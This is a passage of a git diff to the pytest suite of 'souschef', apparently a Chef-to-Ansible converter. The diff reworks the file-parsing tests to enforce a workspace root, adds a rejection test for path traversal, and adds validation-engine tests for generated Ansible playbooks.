+        patch("souschef.parsers.attributes.safe_exists", return_value=True),
+        patch("souschef.parsers.attributes.safe_is_dir", return_value=False),
+        patch(
+            "souschef.parsers.attributes.safe_read_text",
+            return_value="# Just comments",
+        ),
+    ):
         result = parse_attributes("/cookbook/attributes/empty.rb")
 
         assert "Warning: No attributes found" in result
 
 
-def test_parse_attributes_not_found():
+def test_parse_attributes_not_found(monkeypatch):
     """Test parse_attributes with non-existent file."""
-    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.side_effect = FileNotFoundError()
-
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    """Test parse_attributes with non-existent file."""
+    safe_path = Path("/nonexistent/attributes.rb")
+    with (
+        patch("souschef.parsers.attributes._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.attributes._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch("souschef.parsers.attributes.safe_exists", return_value=False),
+        patch("souschef.parsers.attributes.safe_is_dir", return_value=False),
+    ):
         result = parse_attributes("/nonexistent/attributes.rb")
 
         assert "Error: File not found" in result
 
 
-def test_parse_attributes_is_directory():
+def test_parse_attributes_is_directory(monkeypatch):
     """Test parse_attributes when path is a directory."""
-    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.side_effect = IsADirectoryError()
-
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    safe_path = Path("/some/directory")
+    with (
+        patch("souschef.parsers.attributes._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.attributes._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch("souschef.parsers.attributes.safe_exists", return_value=True),
+        patch("souschef.parsers.attributes.safe_is_dir", return_value=True),
+        patch(
+            "souschef.parsers.attributes.safe_read_text",
+            side_effect=IsADirectoryError(),
+        ),
+    ):
         result = parse_attributes("/some/directory")
 
         assert "Error:" in result
@@ -999,11 +1173,20 @@ def test_parse_attributes_is_directory():
 
 def test_parse_attributes_permission_denied():
     """Test parse_attributes with permission error."""
-    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.side_effect = PermissionError()
-
+    safe_path = Path("/forbidden/attributes.rb")
+    with (
+        patch("souschef.parsers.attributes._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.attributes._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch("souschef.parsers.attributes.safe_exists", return_value=True),
+        patch("souschef.parsers.attributes.safe_is_dir", return_value=False),
+        patch(
+            "souschef.parsers.attributes.safe_read_text",
+            side_effect=PermissionError(),
+        ),
+    ):
         result = parse_attributes("/forbidden/attributes.rb")
 
         assert "Error: Permission denied" in result
@@ -1011,25 +1194,43 @@ def test_parse_attributes_permission_denied():
 
 def test_parse_attributes_unicode_error():
     """Test parse_attributes with unicode decode error."""
-    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.side_effect = UnicodeDecodeError(
-            "utf-8", b"", 0, 1, "invalid"
-        )
-
+    safe_path = Path("/binary/file.rb")
+    with (
+        patch("souschef.parsers.attributes._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.attributes._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch("souschef.parsers.attributes.safe_exists", return_value=True),
+        patch("souschef.parsers.attributes.safe_is_dir", return_value=False),
+        patch(
+            "souschef.parsers.attributes.safe_read_text",
+            side_effect=UnicodeDecodeError("utf-8", b"", 0, 1, "invalid"),
+        ),
+    ):
         result = parse_attributes("/binary/file.rb")
 
         assert "Error:" in result and "codec can't decode" in result
 
 
-def test_parse_attributes_other_exception():
+def test_parse_attributes_other_exception(monkeypatch):
     """Test parse_attributes with unexpected exception."""
-    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.side_effect = Exception("Unexpected")
-
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    """Test parse_attributes with unexpected exception."""
+    safe_path = Path("/some/path/attributes.rb")
+    with (
+        patch("souschef.parsers.attributes._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.attributes._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch("souschef.parsers.attributes.safe_exists", return_value=True),
+        patch("souschef.parsers.attributes.safe_is_dir", return_value=False),
+        patch(
+            "souschef.parsers.attributes.safe_read_text",
+            side_effect=Exception("Unexpected"),
+        ),
+    ):
         result = parse_attributes("/some/path/attributes.rb")
 
         assert "An error occurred: Unexpected" in result
@@ -1195,120 +1396,76 @@ def test_format_resolved_attributes_empty():
     assert result == "No attributes found."
 
 
-def test_list_cookbook_structure_success():
+def test_list_cookbook_structure_success(tmp_path, monkeypatch):
     """Test list_cookbook_structure with valid cookbook."""
-    with (
-        patch("souschef.parsers.metadata._normalize_path") as mock_path,
-        patch("souschef.parsers.metadata._safe_join") as mock_safe_join,
-    ):
-        mock_cookbook = MagicMock()
-        mock_path.return_value = mock_cookbook
-        mock_cookbook.is_dir.return_value = True
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
+    cookbook_dir = tmp_path / "nginx"
+    cookbook_dir.mkdir()
+    recipes_dir = cookbook_dir / "recipes"
+    recipes_dir.mkdir()
+    (recipes_dir / "default.rb").write_text("package 'nginx'")
+    (recipes_dir / "install.rb").write_text("package 'nginx'")
+    attributes_dir = cookbook_dir / "attributes"
+    attributes_dir.mkdir()
+    (attributes_dir / "default.rb").write_text("default['nginx']['port'] = 80")
+    (cookbook_dir / "metadata.rb").write_text("name 'nginx'")
 
-        # Mock the various subdirectories
-        mock_recipes = MagicMock()
-        mock_recipes.exists.return_value = True
-        mock_recipes.is_dir.return_value = True
-        mock_recipe_file1 = MagicMock()
-        mock_recipe_file1.is_file.return_value = True
-        mock_recipe_file1.name = "default.rb"
-        mock_recipe_file2 = MagicMock()
-        mock_recipe_file2.is_file.return_value = True
-        mock_recipe_file2.name = "install.rb"
-        mock_recipes.iterdir.return_value = [mock_recipe_file1, mock_recipe_file2]
+    result = list_cookbook_structure(str(cookbook_dir))
 
-        mock_attributes = MagicMock()
-        mock_attributes.exists.return_value = True
-        mock_attributes.is_dir.return_value = True
-        mock_attr_file = MagicMock()
-        mock_attr_file.is_file.return_value = True
-        mock_attr_file.name = "default.rb"
-        mock_attributes.iterdir.return_value = [mock_attr_file]
-
-        mock_metadata = MagicMock()
-        mock_metadata.exists.return_value = True
-
-        # Mock _safe_join for path joining
-        def mock_join_side_effect(base, component):
-            if component == "recipes":
-                return mock_recipes
-            elif component == "attributes":
-                return mock_attributes
-            elif component == "metadata.rb":
-                return mock_metadata
-            else:
-                mock_dir = MagicMock()
-                mock_dir.exists.return_value = False
-                return mock_dir
-
-        mock_safe_join.side_effect = mock_join_side_effect
-
-        result = list_cookbook_structure("/cookbooks/nginx")
-
-        assert "recipes/" in result
-        assert "default.rb" in result
-        assert "install.rb" in result
-        assert "attributes/" in result
-        assert "metadata/" in result
+    assert "recipes/" in result
+    assert "default.rb" in result
+    assert "install.rb" in result
+    assert "attributes/" in result
+    assert "metadata/" in result
 
 
-def test_list_cookbook_structure_empty():
+def test_list_cookbook_structure_empty(tmp_path, monkeypatch):
     """Test list_cookbook_structure with empty directory."""
-    with (
-        patch("souschef.parsers.metadata._normalize_path") as mock_path,
-        patch("souschef.parsers.metadata._safe_join") as mock_safe_join,
-    ):
-        mock_cookbook = MagicMock()
-        mock_path.return_value = mock_cookbook
-        mock_cookbook.is_dir.return_value = True
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
+    cookbook_dir = tmp_path / "empty_cookbook"
+    cookbook_dir.mkdir()
 
-        def mock_join_side_effect(base, component):
-            mock_dir = MagicMock()
-            mock_dir.exists.return_value = False
-            return mock_dir
+    result = list_cookbook_structure(str(cookbook_dir))
 
-        mock_safe_join.side_effect = mock_join_side_effect
-
-        result = list_cookbook_structure("/empty/cookbook")
-
-        assert "Warning: No standard cookbook structure found" in result
+    assert "Warning: No standard cookbook structure found" in result
 
 
-def test_list_cookbook_structure_not_directory():
+def test_list_cookbook_structure_not_directory(tmp_path, monkeypatch):
     """Test list_cookbook_structure with non-directory path."""
-    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
-        mock_cookbook = MagicMock()
-        mock_path.return_value = mock_cookbook
-        mock_cookbook.is_dir.return_value = False
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
+    file_path = tmp_path / "some_file.txt"
+    file_path.write_text("data")
 
-        result = list_cookbook_structure("/some/file.txt")
+    result = list_cookbook_structure(str(file_path))
 
-        assert "Error:" in result
-        assert "is not a directory" in result
+    assert "Error:" in result
+    assert "is not a directory" in result
 
 
-def test_list_cookbook_structure_permission_denied():
+def test_list_cookbook_structure_permission_denied(tmp_path, monkeypatch):
     """Test list_cookbook_structure with permission error."""
-    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
-        mock_cookbook = MagicMock()
-        mock_path.return_value = mock_cookbook
-        mock_cookbook.is_dir.side_effect = PermissionError()
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
+    cookbook_dir = tmp_path / "forbidden"
+    cookbook_dir.mkdir()
 
-        result = list_cookbook_structure("/forbidden/cookbook")
+    with patch("souschef.parsers.metadata.safe_is_dir", side_effect=PermissionError()):
+        result = list_cookbook_structure(str(cookbook_dir))
 
-        assert "Error: Permission denied" in result
+    assert "Error: Permission denied" in result
 
 
-def test_list_cookbook_structure_other_exception():
+def test_list_cookbook_structure_other_exception(tmp_path, monkeypatch):
     """Test list_cookbook_structure with unexpected exception."""
-    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
-        mock_cookbook = MagicMock()
-        mock_path.return_value = mock_cookbook
-        mock_cookbook.is_dir.side_effect = Exception("Unexpected")
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
+    cookbook_dir = tmp_path / "some_path"
+    cookbook_dir.mkdir()
 
-        result = list_cookbook_structure("/some/path")
+    with patch(
+        "souschef.parsers.metadata.safe_is_dir", side_effect=Exception("Unexpected")
+    ):
+        result = list_cookbook_structure(str(cookbook_dir))
 
-        assert "An error occurred: Unexpected" in result
+    assert "An error occurred: Unexpected" in result
 
 
 def test_main():
@@ -1446,7 +1603,7 @@ def test_convert_unknown_resource_type():
 
     # Should not crash, but indicate unknown resource
     assert isinstance(result, str)
-    assert "name: Create unknown_resource test" in result
+    assert "Unsupported Chef resource: unknown_resource" in result
 
 
 def test_convert_chef_databag_to_vars_invalid_json():
@@ -1495,7 +1652,9 @@ def test_validate_databags_directory_empty_path():
     assert "Databags directory path cannot be empty" in result[1]
 
 
-def test_validate_databags_directory_nonexistent():
+def test_validate_databags_directory_nonexistent(monkeypatch):
+    """Test _validate_databags_directory with nonexistent directory."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test _validate_databags_directory with nonexistent directory."""
     result = _validate_databags_directory("/nonexistent/path")
     assert result[0] is None
@@ -1529,13 +1688,17 @@ def test_convert_databag_item_with_error():
         assert result["error"] == "Read error"
 
 
-def test_generate_ansible_vault_from_databags_invalid_directory():
+def test_generate_ansible_vault_from_databags_invalid_directory(monkeypatch):
+    """Test generate_ansible_vault_from_databags with invalid directory."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test generate_ansible_vault_from_databags with invalid directory."""
     result = generate_ansible_vault_from_databags("/nonexistent/path")
     assert "Data bags directory not found" in result
 
 
-def test_analyse_chef_databag_usage_nonexistent_cookbook():
+def test_analyse_chef_databag_usage_nonexistent_cookbook(monkeypatch):
+    """Test analyze_chef_databag_usage with nonexistent cookbook."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test analyze_chef_databag_usage with nonexistent cookbook."""
     result = analyse_chef_databag_usage("/nonexistent/cookbook")
     assert "Cookbook path not found" in result
@@ -1549,7 +1712,9 @@ def test_convert_chef_environment_to_inventory_group_invalid_content():
     assert "inventory" in result.lower() or "group" in result.lower()
 
 
-def test_generate_inventory_from_chef_environments_nonexistent_directory():
+def test_generate_inventory_from_chef_environments_nonexistent_directory(monkeypatch):
+    """Test generate_inventory_from_chef_environments with nonexistent directory."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test generate_inventory_from_chef_environments with nonexistent directory."""
     result = generate_inventory_from_chef_environments("/nonexistent/path")
     assert "Environments directory not found" in result
@@ -1917,9 +2082,16 @@ def test_parse_template_success():
     mock_path = MagicMock(spec=Path)
     mock_path.__str__ = MagicMock(return_value="/path/to/template.erb")
     erb_content = "Hello <%= @name %>!"
-    mock_path.read_text.return_value = erb_content
-
-    with patch("souschef.parsers.template._normalize_path", return_value=mock_path):
+    with (
+        patch("souschef.parsers.template._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.parsers.template._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.parsers.template.safe_exists", return_value=True),
+        patch("souschef.parsers.template.safe_is_dir", return_value=False),
+        patch("souschef.parsers.template.safe_read_text", return_value=erb_content),
+    ):
         result = parse_template("/path/to/template.erb")
 
         assert "variables" in result
@@ -1927,12 +2099,20 @@ def test_parse_template_success():
         assert "name" in result  # Should extract @name variable
 
 
-def test_parse_template_not_found():
+def test_parse_template_not_found(monkeypatch):
+    """Test parse_template with non-existent file."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test parse_template with non-existent file."""
     mock_path = MagicMock(spec=Path)
-    mock_path.read_text.side_effect = FileNotFoundError
-
-    with patch("souschef.parsers.template._normalize_path", return_value=mock_path):
+    with (
+        patch("souschef.parsers.template._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.parsers.template._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.parsers.template.safe_exists", return_value=False),
+        patch("souschef.parsers.template.safe_is_dir", return_value=False),
+    ):
         result = parse_template("/nonexistent/template.erb")
 
         assert "Error: File not found" in result
@@ -1941,9 +2121,19 @@ def test_parse_template_not_found():
 def test_parse_template_permission_denied():
     """Test parse_template with permission denied."""
     mock_path = MagicMock(spec=Path)
-    mock_path.read_text.side_effect = PermissionError
-
-    with patch("souschef.parsers.template._normalize_path", return_value=mock_path):
+    with (
+        patch("souschef.parsers.template._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.parsers.template._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.parsers.template.safe_exists", return_value=True),
+        patch("souschef.parsers.template.safe_is_dir", return_value=False),
+        patch(
+            "souschef.parsers.template.safe_read_text",
+            side_effect=PermissionError,
+        ),
+    ):
         result = parse_template("/forbidden/template.erb")
 
         assert "Error: Permission denied" in result
@@ -2079,9 +2269,19 @@ action :create do
   log "Creating"
 end
 """
-    mock_path.read_text.return_value = resource_content
-
-    with patch("souschef.parsers.resource._normalize_path", return_value=mock_path):
+    with (
+        patch("souschef.parsers.resource._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.parsers.resource._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.parsers.resource.safe_exists", return_value=True),
+        patch("souschef.parsers.resource.safe_is_dir", return_value=False),
+        patch(
+            "souschef.parsers.resource.safe_read_text",
+            return_value=resource_content,
+        ),
+    ):
         result = parse_custom_resource("/path/to/resource.rb")
 
         assert "properties" in result
@@ -2089,12 +2289,20 @@ end
         assert "app_config" in result
 
 
-def test_parse_custom_resource_not_found():
+def test_parse_custom_resource_not_found(monkeypatch):
+    """Test parse_custom_resource with non-existent file."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test parse_custom_resource with non-existent file."""
     mock_path = MagicMock(spec=Path)
-    mock_path.read_text.side_effect = FileNotFoundError
-
-    with patch("souschef.parsers.resource._normalize_path", return_value=mock_path):
+    with (
+        patch("souschef.parsers.resource._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.parsers.resource._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.parsers.resource.safe_exists", return_value=False),
+        patch("souschef.parsers.resource.safe_is_dir", return_value=False),
+    ):
         result = parse_custom_resource("/nonexistent/resource.rb")
 
         assert "Error: File not found" in result
@@ -2103,9 +2311,19 @@ def test_parse_custom_resource_not_found():
 def test_parse_custom_resource_permission_denied():
     """Test parse_custom_resource with permission denied."""
     mock_path = MagicMock(spec=Path)
-    mock_path.read_text.side_effect = PermissionError
-
-    with patch("souschef.parsers.resource._normalize_path", return_value=mock_path):
+    with (
+        patch("souschef.parsers.resource._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.parsers.resource._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.parsers.resource.safe_exists", return_value=True),
+        patch("souschef.parsers.resource.safe_is_dir", return_value=False),
+        patch(
+            "souschef.parsers.resource.safe_read_text",
+            side_effect=PermissionError,
+        ),
+    ):
         result = parse_custom_resource("/forbidden/resource.rb")
 
         assert "Error: Permission denied" in result
@@ -2338,26 +2556,31 @@ def test_extract_template_variables_with_interpolation():
     assert "name" in variables or "message" in variables
 
 
-def test_parse_recipe_with_comments():
+def test_parse_recipe_with_comments(monkeypatch):
     """Test parsing recipe with Ruby comments."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     recipe_content = """
 # Install web server
 package 'nginx' do  # Using nginx
   action :install
 end
 """
-    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.return_value = recipe_content
-
+    safe_path = Path("/recipe.rb")
+    with (
+        patch("souschef.parsers.recipe._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.recipe._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch("souschef.parsers.recipe.safe_read_text", return_value=recipe_content),
+    ):
         result = parse_recipe("/recipe.rb")
 
         assert "nginx" in result
         assert "package" in result
 
 
-def test_parse_attributes_with_case_statement():
+def test_parse_attributes_with_case_statement(tmp_path, monkeypatch):
     """Test parsing attributes with case/when statements."""
     attr_content = """
 case node['platform']
@@ -2367,15 +2590,14 @@ when 'centos'
   default['pkg']['name'] = 'httpd'
 end
 """
-    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.return_value = attr_content
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
+    attr_file = tmp_path / "attributes.rb"
+    attr_file.write_text(attr_content)
 
-        result = parse_attributes("/attributes.rb")
+    result = parse_attributes(str(attr_file))
 
-        # Should extract attributes even from within case statements
-        assert "pkg" in result or "Warning" in result
+    # Should extract attributes even from within case statements
+    assert "pkg" in result or "Warning" in result
 
 
 def test_extract_resource_properties_with_complex_type():
@@ -2392,8 +2614,9 @@ property :ports, Array, default: [80, 443]
     assert "[true, false]" in enabled_prop["type"] or "true" in enabled_prop["type"]
 
 
-def test_parse_recipe_with_multiline_string():
+def test_parse_recipe_with_multiline_string(monkeypatch):
     """Test parsing recipe with multi-line content."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     recipe_content = """
 file '/etc/config' do
   content 'line1
@@ -2402,11 +2625,15 @@ line3'
   action :create
 end
 """
-    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.return_value = recipe_content
-
+    safe_path = Path("/recipe.rb")
+    with (
+        patch("souschef.parsers.recipe._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.recipe._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch("souschef.parsers.recipe.safe_read_text", return_value=recipe_content),
+    ):
         result = parse_recipe("/recipe.rb")
 
         # Should successfully parse despite multi-line strings
@@ -2641,7 +2868,9 @@ end
         assert "dir-test" in result or "controls_count" in result
 
 
-def test_parse_inspec_profile_not_found():
+def test_parse_inspec_profile_not_found(monkeypatch):
+    """Test parsing InSpec profile with non-existent path."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test parsing InSpec profile with non-existent path."""
     with patch("souschef.parsers.inspec._normalize_path") as mock_path:
         mock_instance = MagicMock()
@@ -3566,7 +3795,7 @@ class TestAdvancedParsingFunctions:
 class TestCoreFunctionsCoverage:
     """Test core functions for maximum coverage impact."""
 
-    def test_read_file_success_cases(self):
+    def test_read_file_success_cases(self, monkeypatch):
         """Test read_file with various successful scenarios."""
         from souschef.server import read_file
 
@@ -3587,6 +3816,7 @@ end
             temp_path = f.name
 
         try:
+            monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(Path(temp_path).parent))
             result = read_file(temp_path)
             assert isinstance(result, str)
             assert "nginx" in result
@@ -3599,22 +3829,23 @@ end
         finally:
             Path(temp_path).unlink()
 
-    def test_read_file_error_cases(self, tmp_path):
+    def test_read_file_error_cases(self, tmp_path, monkeypatch):
         """Test read_file error handling."""
         from souschef.server import read_file
 
         # Test with nonexistent file
         result = read_file("/nonexistent/file.rb")
-        assert "Error: File not found" in result
+        assert "Error" in result
 
         # Test with directory instead of file
+        monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
         result = read_file(str(tmp_path))
-        assert "Error:" in result and "directory" in result
+        assert "Error" in result and "directory" in result
 
         # Test with permission denied (try /root if it exists)
         if Path("/root").exists():
             result = read_file("/root")
-            assert "Error:" in result
+            assert "Error" in result
 
     def test_list_directory_success_cases(self, tmp_path):
         """Test list_directory with real directories."""
@@ -3637,6 +3868,15 @@ end
         # Test with nonexistent directory
         result = list_directory("/nonexistent/directory")
         assert isinstance(result, str) and "Error" in result
+
+    def test_list_directory_rejects_outside_workspace(self, tmp_path, monkeypatch):
+        """Test list_directory rejects paths outside the workspace root."""
+        from souschef.server import list_directory
+
+        monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
+        result = list_directory("/")
+        assert "Error" in result
+        assert "Path traversal attempt" in result
 
     def test_parse_recipe_with_real_content(self):
         """Test parse_recipe with realistic Chef recipes."""
@@ -4236,9 +4476,11 @@ class TestInDepthFunctionCoverage:
                 assert isinstance(result, str)
                 # Should handle errors gracefully
 
-    def test_directory_operations_comprehensive(self, tmp_path):
+    def test_directory_operations_comprehensive(self, tmp_path, monkeypatch):
         """Test directory operations comprehensively."""
         from souschef.server import list_cookbook_structure, list_directory
+
+        monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
 
         # Test with various directory types
         test_dirs = [
@@ -4249,15 +4491,17 @@ class TestInDepthFunctionCoverage:
 
         for test_dir in test_dirs:
             if Path(test_dir).exists():
-                # Test list_directory
                 result = list_directory(test_dir)
-                assert isinstance(result, (list, str))
+                if Path(test_dir).resolve().is_relative_to(tmp_path.resolve()):
+                    assert isinstance(result, (list, str))
+                else:
+                    assert isinstance(result, str) and "Error" in result
 
                 # Test list_cookbook_structure
                 result = list_cookbook_structure(test_dir)
                 assert isinstance(result, str)
 
-    def test_json_parsing_and_formatting(self):
+    def test_json_parsing_and_formatting(self, monkeypatch):
         """Test JSON operations within the functions."""
         from souschef.server import read_file
 
@@ -4274,6 +4518,7 @@ class TestInDepthFunctionCoverage:
             temp_path = f.name
 
         try:
+            monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(Path(temp_path).parent))
             result = read_file(temp_path)
             assert isinstance(result, str)
             # Should be able to read JSON files
@@ -11910,13 +12155,14 @@ class TestComplexChefBlocks:
         assert "ansible_check_mode" in result or "ansible_facts" in result
 
     def test_convert_chef_block_complex_unhandled(self):
-        """Test that complex unhandled blocks get TODO comment."""
+        """Test that complex unhandled blocks return a safe expression."""
         from souschef.server import _convert_chef_block_to_ansible
 
         block = 'Chef::SomeComplexClass.new.method_call("arg")'
         result = _convert_chef_block_to_ansible(block)
 
-        assert "TODO" in result
+        assert "ansible_check_mode" in result
+        assert "review" in result.lower()
 
 
 class TestDeploymentPatternFormatting:
@@ -13684,6 +13930,20 @@ class TestValidationFramework:
         assert "[performance]" in result_str
         assert "Performance tip" in result_str
 
+    def test_validation_result_repr_includes_optional_fields(self):
+        """Test ValidationResult includes location and suggestion details."""
+        result = ValidationResult(
+            level=ValidationLevel.ERROR,
+            category=ValidationCategory.SYNTAX,
+            message="Broken syntax",
+            location="line 2",
+            suggestion="Fix indentation",
+        )
+
+        result_str = repr(result)
+        assert "Location: line 2" in result_str
+        assert "Suggestion: Fix indentation" in result_str
+
     def test_validation_engine_creation(self):
         """Test ValidationEngine initialization."""
         engine = ValidationEngine()
@@ -13782,6 +14042,673 @@ def test_nginx(host):
 
         # Should pass validation
         assert isinstance(results, list)
+
+    @pytest.mark.parametrize(
+        "conversion_type,method_name",
+        [
+            ("resource", "_validate_resource_conversion"),
+            ("recipe", "_validate_recipe_conversion"),
+            ("template", "_validate_template_conversion"),
+            ("inspec", "_validate_inspec_conversion"),
+        ],
+    )
+    def test_validation_engine_routes_conversion(self, conversion_type, method_name):
+        """Test conversion routing to the expected validator."""
+        engine = ValidationEngine()
+
+        with patch.object(engine, method_name) as validator:
+            engine.validate_conversion(conversion_type, "content")
+            validator.assert_called_once_with("content")
+
+    def test_validation_engine_unknown_conversion_type(self):
+        """Test unknown conversion type yields warning result."""
+        engine = ValidationEngine()
+
+        results = engine.validate_conversion("unknown", "content")
+        assert len(results) == 1
+        assert results[0].level == ValidationLevel.WARNING
+        assert results[0].category == ValidationCategory.SYNTAX
+        assert "Unknown conversion type" in results[0].message
+
+    def test_validation_engine_add_result_records_details(self):
+        """Test _add_result stores optional details correctly."""
+        engine = ValidationEngine()
+
+        engine._add_result(
+            ValidationLevel.WARNING,
+            ValidationCategory.SECURITY,
+            "Potential issue",
+            location="task 3",
+            suggestion="Review defaults",
+        )
+
+        assert len(engine.results) == 1
+        result = engine.results[0]
+        assert result.level == ValidationLevel.WARNING
+        assert result.category == ValidationCategory.SECURITY
+        assert result.message == "Potential issue"
+        assert result.location == "task 3"
+        assert result.suggestion == "Review defaults"
+
+    def test_validate_yaml_syntax_invalid_content(self):
+        """Test invalid YAML content adds a syntax error."""
+        engine = ValidationEngine()
+
+        engine._validate_yaml_syntax("- name: bad\n  - indent")
+
+        assert any(
+            result.level == ValidationLevel.ERROR
+            and "Invalid YAML syntax" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_ansible_module_exists_unknown_module(self):
+        """Test unknown Ansible module yields a warning."""
+        engine = ValidationEngine()
+
+        engine._validate_ansible_module_exists(
+            "- name: Custom\n  ansible.builtin.unknown: {}"
+        )
+
+        assert any(
+            result.level == ValidationLevel.WARNING
+            and "Unknown Ansible module" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_ansible_module_exists_known_module(self):
+        """Test known Ansible module does not add warnings."""
+        engine = ValidationEngine()
+
+        engine._validate_ansible_module_exists(
+            "- name: Debug\n  ansible.builtin.debug: {}"
+        )
+
+        assert engine.results == []
+
+    def test_validate_idempotency_requires_changed_when(self):
+        """Test command tasks without changed_when trigger warning."""
+        engine = ValidationEngine()
+
+        engine._validate_idempotency(
+            "- name: Run command\n  ansible.builtin.command: /bin/test"
+        )
+
+        assert any(
+            result.level == ValidationLevel.WARNING and "changed_when" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_idempotency_with_changed_when(self):
+        """Test command tasks with changed_when do not warn."""
+        engine = ValidationEngine()
+
+        engine._validate_idempotency(
+            "- name: Run command\n  ansible.builtin.command: /bin/test\n  changed_when: false"
+        )
+
+        assert engine.results == []
+
+    def test_validate_resource_dependencies_service_task(self):
+        """Test service tasks yield dependency info."""
+        engine = ValidationEngine()
+
+        engine._validate_resource_dependencies(
+            "- name: Start service\n  ansible.builtin.service:\n    state: started"
+        )
+
+        assert any(
+            result.level == ValidationLevel.INFO
+            and "Service task should have dependency" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_task_naming_empty_and_short(self):
+        """Test task naming checks for empty and short names."""
+        engine = ValidationEngine()
+
+        engine._validate_task_naming("- name: ''\n  ansible.builtin.debug: {}")
+        assert any(
+            result.level == ValidationLevel.WARNING and "empty name" in result.message
+            for result in engine.results
+        )
+
+        engine.results = []
+        engine._validate_task_naming("- name: test\n  ansible.builtin.debug: {}")
+        assert any(
+            result.level == ValidationLevel.INFO and "very short" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_task_naming_long_name(self):
+        """Test descriptive task names do not trigger warnings."""
+        engine = ValidationEngine()
+
+        engine._validate_task_naming(
+            "- name: Install nginx package\n  ansible.builtin.package: {}"
+        )
+
+        assert engine.results == []
+
+    def test_validate_module_usage_warns_on_creates(self):
+        """Test creates with file module yields warning."""
+        engine = ValidationEngine()
+
+        engine._validate_module_usage(
+            "- name: Touch file\n  ansible.builtin.file:\n    creates: /tmp/a"
+        )
+
+        assert any(
+            result.level == ValidationLevel.WARNING and "creates" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_variable_usage_ansible_prefix(self):
+        """Test ansible_ prefixed variables yield info message."""
+        engine = ValidationEngine()
+
+        engine._validate_variable_usage("{{ ansible_custom_var }}")
+
+        assert any(
+            result.level == ValidationLevel.INFO and "ansible_" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_variable_usage_known_builtins(self):
